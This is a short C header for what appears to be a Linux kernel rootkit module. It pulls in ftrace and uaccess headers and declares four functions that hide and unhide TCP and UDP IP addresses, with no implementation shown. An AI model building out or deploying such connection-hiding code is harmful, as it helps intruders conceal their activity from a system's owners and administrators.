#ifndef HIDEIP_H
#define HIDEIP_H

#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/version.h>

void hide_tcp_ip(char *);
void show_hidden_tcp_ip(char *);
void hide_udp_ip(char *);
void show_hidden_udp_ip(char *);

#endif
